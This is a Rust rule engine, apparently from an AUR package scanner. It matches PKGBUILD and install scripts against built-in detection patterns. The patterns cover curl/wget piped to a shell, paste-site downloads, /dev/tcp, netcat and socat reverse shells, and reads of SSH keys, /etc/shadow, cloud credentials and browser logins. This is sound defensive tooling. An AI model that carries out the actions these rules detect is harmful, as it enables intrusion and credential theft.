//! Rule engine for pattern-based security detection

mod loader;

pub use loader::RuleLoader;

use crate::error::Result;
use crate::textutil::{
    deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
};
use crate::types::{Category, FileType, Severity};
use regex::{Regex, RegexBuilder};
use serde::Deserialize;
use std::collections::HashMap;
use std::path::Path;

/// A security detection rule (pattern-based). Community rule files use this
/// shape; `file_types`/`patterns` default to empty so a rule file is concise.
#[derive(Debug, Clone, Deserialize)]
pub struct Rule {
    /// Unique identifier (e.g., "DLE-001")
    pub id: String,
    /// Human-readable name
    pub name: String,
    /// Detailed description
    pub description: String,
    /// Severity level
    pub severity: Severity,
    /// Category of the rule
    pub category: Category,
    /// Patterns to match
    #[serde(default)]
    pub patterns: Vec<Pattern>,
    /// File types this rule applies to. Defaults to PKGBUILD + install script
    /// rather than empty: a rule indexed under no file type is silently never
    /// matched, so a community rule that omits `file_types` would be inert.
    #[serde(default = "default_file_types")]
    pub file_types: Vec<FileType>,
    /// Recommendation for fixing
    pub recommendation: String,
    /// CWE ID if applicable
    #[serde(default)]
    pub cwe_id: Option<String>,
    /// Whether this rule is enabled
    #[serde(default = "default_true")]
    pub enabled: bool,
}

fn default_true() -> bool {
    true
}

/// Default file types for a rule that does not specify them. Empty would make
/// the rule inert (it is indexed per file type), so default to the two types
/// every scan looks at.
fn default_file_types() -> Vec<FileType> {
    vec![FileType::Pkgbuild, FileType::InstallScript]
}

/// Pattern type for matching
#[derive(Debug, Clone, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Pattern {
    /// Regular expression pattern
    Regex { pattern: String },
    /// Literal string match
    Literal {
        text: String,
        #[serde(default)]
        case_sensitive: bool,
    },
    /// Function name pattern
    Function {
        name: String,
        #[serde(default)]
        body_pattern: Option<String>,
    },
    /// Variable value pattern
    Variable {
        name: String,
        #[serde(default)]
        value_pattern: Option<String>,
    },
}

/// A compiled rule with pre-compiled regex patterns
pub struct CompiledRule {
    /// Original rule definition
    pub rule: Rule,
    /// Compiled regex patterns
    pub compiled_patterns: Vec<CompiledPattern>,
}

/// A compiled pattern ready for matching
#[derive(Clone)]
pub enum CompiledPattern {
    Regex(Regex),
    Literal { text: String, case_sensitive: bool },
    Function { name: Regex, body_pattern: Option<Regex> },
    Variable { name: String, value_pattern: Option<Regex> },
}

/// Compile a rule regex with safe defaults.
///
/// * Case-insensitive by default so trivial case variation (`CURL`, `Xmrig`)
///   cannot evade a rule. A pattern that needs case sensitivity for a specific
///   span (e.g. a Base58 address class) opts out inline with `(?-i:...)`.
/// * Explicit size/DFA limits: rule patterns can come from filesystem
///   `rules.d` files, so bound compiled-program and DFA memory rather than
///   trusting every author.
fn compile_regex(pattern: &str) -> Result<Regex> {
    RegexBuilder::new(pattern)
        .case_insensitive(true)
        .size_limit(4 * 1024 * 1024)
        .dfa_size_limit(16 * 1024 * 1024)
        .build()
        .map_err(Into::into)
}

impl CompiledPattern {
    /// Compile a pattern
    pub fn compile(pattern: &Pattern) -> Result<Self> {
        match pattern {
            Pattern::Regex { pattern } => {
                let re = compile_regex(pattern)?;
                Ok(CompiledPattern::Regex(re))
            }
            Pattern::Literal {
                text,
                case_sensitive,
            } => Ok(CompiledPattern::Literal {
                text: text.clone(),
                case_sensitive: *case_sensitive,
            }),
            Pattern::Function { name, body_pattern } => {
                let name_re = compile_regex(name)?;
                let body_re = body_pattern
                    .as_ref()
                    .map(|p| compile_regex(p))
                    .transpose()?;
                Ok(CompiledPattern::Function {
                    name: name_re,
                    body_pattern: body_re,
                })
            }
            Pattern::Variable { name, value_pattern } => {
                let value_re = value_pattern
                    .as_ref()
                    .map(|p| compile_regex(p))
                    .transpose()?;
                Ok(CompiledPattern::Variable {
                    name: name.clone(),
                    value_pattern: value_re,
                })
            }
        }
    }
}

/// A match result from the rule engine
#[derive(Debug, Clone)]
pub struct RuleMatch {
    /// The rule that matched
    pub rule_id: String,
    /// Line number where the match occurred
    pub line: usize,
    /// Column where the match started
    pub column: usize,
    /// The matched text
    pub matched_text: String,
    /// Context around the match
    pub context: String,
}

/// Rule engine for loading and matching rules
pub struct RuleEngine {
    /// Compiled rules organized by file type
    rules_by_type: HashMap<FileType, Vec<CompiledRule>>,
    /// All rules indexed by ID
    rules_by_id: HashMap<String, CompiledRule>,
}

impl RuleEngine {
    /// Create a new empty rule engine
    pub fn new() -> Self {
        Self {
            rules_by_type: HashMap::new(),
            rules_by_id: HashMap::new(),
        }
    }

    /// Load rules from a directory containing TOML files
    pub fn load_rules_from_dir(&mut self, dir: &Path) -> Result<()> {
        let loader = RuleLoader::new();
        let rules = loader.load_from_directory(dir)?;

        for rule in rules {
            self.add_rule(rule)?;
        }

        Ok(())
    }

    /// Add a single rule to the engine
    pub fn add_rule(&mut self, rule: Rule) -> Result<()> {
        if !rule.enabled {
            return Ok(());
        }

        let mut compiled_patterns = Vec::new();
        for pattern in &rule.patterns {
            compiled_patterns.push(CompiledPattern::compile(pattern)?);
        }

        let compiled = CompiledRule {
            rule: rule.clone(),
            compiled_patterns,
        };

        // Index by file type
        for file_type in &rule.file_types {
            self.rules_by_type
                .entry(*file_type)
                .or_default()
                .push(CompiledRule {
                    rule: rule.clone(),
                    compiled_patterns: compiled.compiled_patterns.clone(),
                });
        }

        // Index by ID
        self.rules_by_id.insert(rule.id.clone(), compiled);

        Ok(())
    }

    /// Add built-in rules
    ///
    /// A single rule with a malformed pattern must never silently disable the
    /// rest of the built-in ruleset (a missed detection is a security failure),
    /// so a rule that fails to compile is skipped with a warning rather than
    /// aborting the whole load.
    pub fn add_builtin_rules(&mut self) -> Result<()> {
        let builtin_rules = get_builtin_rules();
        for rule in builtin_rules {
            let rule_id = rule.id.clone();
            if let Err(e) = self.add_rule(rule) {
                tracing::warn!("skipping built-in rule {rule_id}: failed to compile: {e}");
            }
        }
        Ok(())
    }

    /// Match content against all rules for a file type
    pub fn match_content(&self, content: &str, file_type: FileType) -> Vec<RuleMatch> {
        let mut matches = Vec::new();

        let rules = match self.rules_by_type.get(&file_type) {
            Some(r) => r,
            None => return matches,
        };

        // Work on *logical* lines: bash backslash-newline continuations are
        // spliced back together so a payload split across physical lines
        // (`curl evil \`<nl>`| sh`) cannot evade a single-line rule. Each entry
        // carries the originating physical line number for reporting.
        let lines: Vec<(usize, String)> = logical_lines(content);
        let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
        // De-obfuscated variant per line: ANSI-C quoting (`$'\x63'`) decoded and
        // adjacent-quote word-splitting (`"b"'u''n'`) collapsed, so a payload
        // hidden to dodge literal matching is still seen by every rule (e.g. an
        // obfuscated `bun add` fires ATOMIC-002). `None` for un-obfuscated lines,
        // so ordinary quoted strings are not re-matched.
        let deobf: Vec<Option<String>> = lines.iter().map(|(_, s)| deobfuscate(s)).collect();
        // Lines that are informational text printed to the user (the body of a
        // pure-printer heredoc, e.g. a `cat <<EOF` post_install message) are not
        // executed, so low-risk path-presence rules must not match them. A
        // heredoc fed to an interpreter, or redirected to a file, is still code.
        let informational = informational_lines(&line_strs);

        for compiled in rules {
            for (idx, (phys_line, line)) in lines.iter().enumerate() {
                // Skip pure comment lines and printed heredoc bodies. A heredoc
                // is only marked informational when it is fed to a pure printer
                // (cat/echo/printf) and not piped/redirected; a heredoc fed to an
                // interpreter (`bash <<EOF`) is NOT informational and is scanned
                // here, so executable payloads hidden in a heredoc are caught.
                let trimmed = line.trim();
                if trimmed.starts_with('#') || informational[idx] {
                    continue;
                }

                for pattern in &compiled.compiled_patterns {
                    if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                        matches.push(RuleMatch {
                            rule_id: compiled.rule.id.clone(),
                            line: *phys_line,
                            column: m.0,
                            matched_text: m.1,
                            context: line.clone(),
                        });
                    } else if let Some(decoded) = &deobf[idx] {
                        // Raw line didn't match, but its de-obfuscated form might.
                        if let Some(m) = self.match_pattern(pattern, decoded, &compiled.rule) {
                            matches.push(RuleMatch {
                                rule_id: compiled.rule.id.clone(),
                                line: *phys_line,
                                column: m.0,
                                matched_text: m.1,
                                context: format!("{line}    [de-obfuscated → {decoded}]"),
                            });
                        }
                    }
                }
            }
        }

        matches
    }

    /// Match a single pattern against a line
    fn match_pattern(
        &self,
        pattern: &CompiledPattern,
        line: &str,
        _rule: &Rule,
    ) -> Option<(usize, String)> {
        match pattern {
            CompiledPattern::Regex(re) => {
                re.find(line).map(|m| (m.start() + 1, m.as_str().to_string()))
            }
            CompiledPattern::Literal {
                text,
                case_sensitive,
            } => {
                let found = if *case_sensitive {
                    line.find(text)
                } else {
                    line.to_lowercase().find(&text.to_lowercase())
                };
                found.map(|pos| (pos + 1, text.clone()))
            }
            _ => None, // Function and Variable patterns need different handling
        }
    }

    /// Get a rule by ID
    pub fn get_rule(&self, id: &str) -> Option<&Rule> {
        self.rules_by_id.get(id).map(|c| &c.rule)
    }

    /// Get count of loaded rules
    pub fn rule_count(&self) -> usize {
        self.rules_by_id.len()
    }
}

impl Default for RuleEngine {
    fn default() -> Self {
        let mut engine = Self::new();
        let _ = engine.add_builtin_rules();
        // Load community rule files so user-contributed detections actually run
        // (the same directories the catalog indexes). A malformed file warns and
        // is skipped; it never breaks the engine.
        for dir in user_rule_dirs() {
            if dir.is_dir() {
                if let Err(e) = engine.load_rules_from_dir(&dir) {
                    tracing::warn!("failed to load community rules from {}: {}", dir.display(), e);
                }
            }
        }
        engine
    }
}

/// Standard directories users/distros can drop community rule TOML files into.
pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
    let mut dirs = vec![
        std::path::PathBuf::from("/usr/share/aur-scanner/rules.d"),
        std::path::PathBuf::from("/etc/aur-scanner/rules.d"),
    ];
    if let Some(cfg) = dirs::config_dir() {
        dirs.push(cfg.join("aur-scanner/rules.d"));
    }
    dirs
}

/// Flag each line that is printed text rather than executed code -- the body of
/// a non-redirected heredoc, or a single-line pure message print (`echo`/`note`/
/// `msg "..."`) -- so path/string-presence rules don't match user-facing
/// messages. (E.g. a `.install` that says `note "put flags in ~/.config/x"` must
/// not trip the "hidden file in home" rule: it mentions a path, it doesn't write
/// one. This was a real false positive on google-chrome / vscode.)
///
/// `pub(crate)` so structural analyzers can share the exact same pre-filter: the
/// privilege analyzer routes function bodies through it so a printed
/// `sudo`/`setcap`/`sudoers` message or a documentation heredoc cannot raise a
/// Critical false positive (defect #5).
pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
    let mut flags = vec![false; lines.len()];
    let mut terminator: Option<String> = None;
    for (i, line) in lines.iter().enumerate() {
        if let Some(delim) = &terminator {
            flags[i] = true; // inside a printed heredoc body
            if line.trim() == delim.as_str() {
                terminator = None;
            }
            continue;
        }
        if let Some(delim) = heredoc_message_delim(line) {
            terminator = Some(delim);
        } else if is_pure_message_print(line) {
            flags[i] = true;
        }
    }
    flags
}

/// Whether `line` is a single-line message print whose argument is just text the
/// user sees -- it cannot run another command or write a file, so a path/string
/// it mentions is a mention, not an action.
///
/// Conservative on purpose: the command must be a known printer AND the line
/// must contain no redirection, pipe, command substitution, or command chaining
/// (any of which could execute or write). `echo x > ~/.bashrc`, `echo "$(curl
/// evil)"`, and `echo x | sh` therefore are NOT treated as inert.
fn is_pure_message_print(line: &str) -> bool {
    let t = line.trim();
    let cmd = t.split([' ', '\t']).next().unwrap_or("");
    const PRINTERS: &[&str] = &[
        "echo", "printf", "print", "note", "msg", "msg2", "warning", "plain", "error",
    ];
    if !PRINTERS.contains(&cmd) {
        return false;
    }
    // Anything that could redirect, pipe, substitute, or chain a command means
    // the line is not a pure print -- scan it.
    !(t.contains('>')
        || t.contains('|')
        || t.contains("$(")
        || t.contains('`')
        || t.contains(';')
        || t.contains('&'))
}

/// If `line` opens a heredoc that just prints a message (no redirection to a
/// file), return its terminator delimiter. Redirected heredocs write content
/// somewhere and must still be scanned, so they return `None`.
fn heredoc_message_delim(line: &str) -> Option<String> {
    let pos = line.find("<<")?;
    let rest = line[pos + 2..].strip_prefix('-').unwrap_or(&line[pos + 2..]).trim_start();
    let bytes = rest.as_bytes();
    let quote = match bytes.first() {
        Some(&b'"') | Some(&b'\'') => Some(bytes[0]),
        _ => None,
    };
    let mut i = if quote.is_some() { 1 } else { 0 };
    let start = i;
    while i < bytes.len() {
        let c = bytes[i];
        match quote {
            Some(q) if c == q => break,
            Some(_) => i += 1,
            None if c.is_ascii_alphanumeric() || c == b'_' => i += 1,
            None => break,
        }
    }
    if i == start {
        return None;
    }
    let delim = &rest[start..i];
    // `$((x << 2))` is an arithmetic shift, not a heredoc.
    if quote.is_none() && delim.as_bytes()[0].is_ascii_digit() {
        return None;
    }
    // Redirected to a file (`> f`, `>> f`, `| tee f`)? Then it writes content
    // and the body must be scanned.
    let redirected = line.contains(">>")
        || line[..pos].contains('>')
        || rest[i..].contains('>')
        || line.contains("tee ");
    if redirected {
        return None;
    }
    // Only treat the body as printed-not-executed when the consuming command is
    // a pure printer (cat/echo/printf) AND the heredoc is not piped into another
    // command. A heredoc fed to an interpreter -- `bash <<EOF`, `python <<EOF`,
    // `ssh host <<EOF`, `cat <<EOF | bash` -- runs its body, so it must be
    // scanned. When unsure, do NOT suppress (fail toward scanning).
    let before = &line[..pos];
    let last_command = before
        .rsplit([';', '|', '&', '('])
        .next()
        .unwrap_or(before);
    let is_pure_printer = last_command
        .split_whitespace()
        .next()
        .map(|cmd| matches!(cmd, "cat" | "echo" | "printf"))
        .unwrap_or(false);
    // A pipe anywhere on the opener means the body may be fed to a command.
    let piped = line.contains('|');
    if !is_pure_printer || piped {
        return None;
    }
    Some(delim.to_string())
}

/// Get built-in security rules (pattern-based). Public so the catalog can
/// index them as the single source of truth.
pub fn get_builtin_rules() -> Vec<Rule> {
    vec![
        // ============================================================
        // CRITICAL: Download and Execute (from real-world attacks)
        // ============================================================
        Rule {
            id: "DLE-001".to_string(),
            name: "Curl pipe to shell".to_string(),
            description: "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Download scripts first, review them, then execute".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "DLE-002".to_string(),
            name: "Wget pipe to shell".to_string(),
            description: "Downloading and executing remote scripts via wget".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Download scripts first, review them, then execute".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "DLE-003".to_string(),
            name: "Curl output executed".to_string(),
            description: "Curl output saved and executed - common malware pattern".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"curl\s+.*-o\s+[^\s]+\s*&&.*\b(ba)?sh\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"curl\s+.*-O\s+.*&&.*\./".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review downloaded scripts before execution".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Pastebin downloads (2018 xeactor attack vector)
        // ============================================================
        Rule {
            id: "PASTE-001".to_string(),
            name: "Pastebin download".to_string(),
            description: "Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(curl|wget)\s+.*(pastebin\.com|paste\.ee|ptpb\.pw|ix\.io|dpaste|hastebin|privatebin|ghostbin|rentry\.co)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"https?://(pastebin\.com|paste\.ee|ptpb\.pw|ix\.io|dpaste|hastebin\.com|privatebin|ghostbin\.co|rentry\.co)/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Never download code from paste sites - this is a major red flag".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Reverse Shells
        // ============================================================
        Rule {
            id: "SHELL-001".to_string(),
            name: "Bash reverse shell".to_string(),
            description: "Pattern indicates a bash reverse shell connection".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex {
                // Any /dev/tcp or /dev/udp host/port -- hostname, IPv4, IPv6, or
                // hex/decimal IP -- is a reverse-shell channel. The old rule only
                // matched dotted-quad IPv4 and missed `/dev/tcp/evil.com/4444`,
                // `/dev/tcp/0x7f000001/4444`, IPv6, etc.
                pattern: r"/dev/(tcp|udp)/[^\s/]+/[^\s/]+".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-002".to_string(),
            name: "Netcat reverse shell".to_string(),
            description: "Netcat with execute flag indicates reverse shell".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"nc\s+.*-e\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"ncat\s+.*-e\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"nc\s+.*-c\s+".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-003".to_string(),
            name: "Python reverse shell".to_string(),
            description: "Python socket connection pattern indicates reverse shell".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"python.*socket.*connect".to_string(),
                },
                Pattern::Regex {
                    pattern: r"python.*-c.*import\s+socket".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-004".to_string(),
            name: "Socat shell".to_string(),
            description: "Socat can be used for reverse shells".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"socat\s+.*EXEC:".to_string(),
                },
                Pattern::Regex {
                    pattern: r"socat\s+.*TCP:".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Socat TCP connections are suspicious in build scripts".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Credential Theft
        // ============================================================
        Rule {
            id: "CRED-001".to_string(),
            name: "SSH key access".to_string(),
            description: "Accessing SSH private keys during build/install".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.ssh/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.ssh/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/home/[^/]+/\.ssh/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access user SSH keys".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRED-002".to_string(),
            name: "GPG key access".to_string(),
            description: "Accessing GPG keyring during build/install".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.gnupg/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.gnupg/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access user GPG keys".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRED-003".to_string(),
            name: "Password file access".to_string(),
            description: "Accessing password files or credential stores".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/shadow".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.password-store".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.netrc".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.aws/credentials".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.kube/config".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access credential stores".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Browser Data Theft
        // ============================================================
        Rule {
            id: "BROWSER-001".to_string(),
            name: "Browser profile access".to_string(),
            description: "Accessing browser profiles may indicate credential theft".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.mozilla/firefox".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/google-chrome".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/chromium".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/BraveSoftware".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.librewolf".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.zen".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access browser profiles".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },
        Rule {
            id: "BROWSER-002".to_string(),
            name: "Browser database access".to_string(),
            description: "Accessing browser SQLite databases (passwords, cookies, history)".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"logins\.json".to_string(),
                },
                Pattern::Regex {
                    pattern: r"Login Data".to_string(),
                },
                Pattern::Regex {
                    pattern: r"cookies\.sqlite".to_string(),
                },
                Pattern::Regex {
                    pattern: r"places\.sqlite".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access browser databases".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },

        // NOTE: privilege escalation (PRIV-001..006: sudo, SUID/SGID, sudoers,
        // capabilities, kernel modules, install-hook sudo) is owned by the
        // privilege analyzer (privilege.rs), which is function-aware. It is not
        // duplicated as pattern rules, to keep each finding ID single-owner.

        // ============================================================
        // CRITICAL: Install Script Execution (CHAOS RAT attack vector)
        // ============================================================
        Rule {
            id: "INSTALL-001".to_string(),
            name: "Python execution in install script".to_string(),
            description: "Executing Python in post_install is suspicious. Used in July 2025 CHAOS RAT attack.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\bpython[23]?\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"python\s+-c".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts should not execute Python code".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "INSTALL-002".to_string(),
            name: "Binary execution in install script".to_string(),
            description: "Executing binaries from /opt or package directories during install".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/opt/[^/]+/[^/]+\.(py|sh|bin)".to_string(),
                },
                // A relative script/binary run in COMMAND position with a
                // dropped-payload extension. Requiring command position removes
                // the `cd ./build` argument false positive; requiring an
                // executable extension removes the `./configure` autotools false
                // positive (an extensionless build script). Dropped payloads
                // (`./payload.sh`, `./x/y.bin`) still match (defect #10). An
                // extensionless `./name` is intentionally not flagged here
                // because it is indistinguishable from `./configure`; the
                // campaign payload vectors are covered by INSTALL-001/003/004,
                // HIDDEN-003 and the ATOMIC rules.
                Pattern::Regex {
                    pattern: r"(?:^|[;&|]\s*)\./[\w./-]*\.(?:sh|bash|bin|run|elf|out|py|pl|rb|php)\b"
                        .to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Review any binary execution during installation".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "INSTALL-003".to_string(),
            name: "Network access in install script".to_string(),
            description: "Install scripts should not make network connections".to_string(),
            severity: Severity::Critical,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\b(curl|wget|aria2c|axel)\b".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts should never download additional content".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "INSTALL-004".to_string(),
            name: "Language package manager invoked in install hook".to_string(),
            description: "An install scriptlet invokes a language package manager to fetch/install packages. Installing a package runs its arbitrary build/lifecycle scripts (preinstall, build.rs, setup.py, go generate, ...) at install time -- a remote code execution vector. The June 2026 Atomic Arch campaign used `npm install` this way (see ATOMIC-002); the same applies to pip, poetry, uv, pdm, cargo, go, gem, composer, conda, deno, and others.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"\b(pip[23]?|pipx)\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bpoetry\s+(add|install)\b".to_string() },
                Pattern::Regex { pattern: r"\buv\s+(add|sync|pip|tool|run)\b".to_string() },
                Pattern::Regex { pattern: r"\bpdm\s+(add|install|sync)\b".to_string() },
                Pattern::Regex { pattern: r"\bconda\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bcargo\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bgo\s+(install|get)\b".to_string() },
                Pattern::Regex { pattern: r"\bgem\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bcomposer\s+(require|install)\b".to_string() },
                Pattern::Regex { pattern: r"\bdeno\s+(install|add|run|cache)\b".to_string() },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Persistence Mechanisms (2018 & 2025 attacks)
        // ============================================================
        Rule {
            id: "PERSIST-001".to_string(),
            name: "Systemd service creation in install".to_string(),
            description: "Creating systemd services in install scripts enables persistence. Used in 2018 xeactor and 2025 CHAOS RAT attacks.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"systemctl\s+(enable|start|daemon-reload)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/systemd/system/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"~/.config/systemd/user/".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Services should be enabled by the user, not automatically".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "PERSIST-002".to_string(),
            name: "Systemd timer creation".to_string(),
            description: "Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.timer".to_string(),
                },
                Pattern::Regex {
                    pattern: r"OnBootSec".to_string(),
                },
                Pattern::Regex {
                    pattern: r"OnUnitActiveSec".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Timers should be user-controlled; review carefully".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "PERSIST-003".to_string(),
            name: "Cron job creation".to_string(),
            description: "Creating cron jobs for persistence".to_string(),
            severity: Severity::High,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/cron".to_string(),
                },
                Pattern::Regex {
                    pattern: r"crontab\s+".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Cron jobs should be managed by the user".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "PERSIST-004".to_string(),
            name: "rc.local modification".to_string(),
            description: "Modifying rc.local for boot persistence".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/rc\.local".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/rc\.d/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not modify boot scripts".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "PERSIST-005".to_string(),
            name: "XDG autostart creation".to_string(),
            description: "Creating autostart entries enables persistence at user login".to_string(),
            severity: Severity::High,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.config/autostart/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/xdg/autostart/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Autostart entries should be user-controlled".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "PERSIST-006".to_string(),
            name: "Systemd masquerading".to_string(),
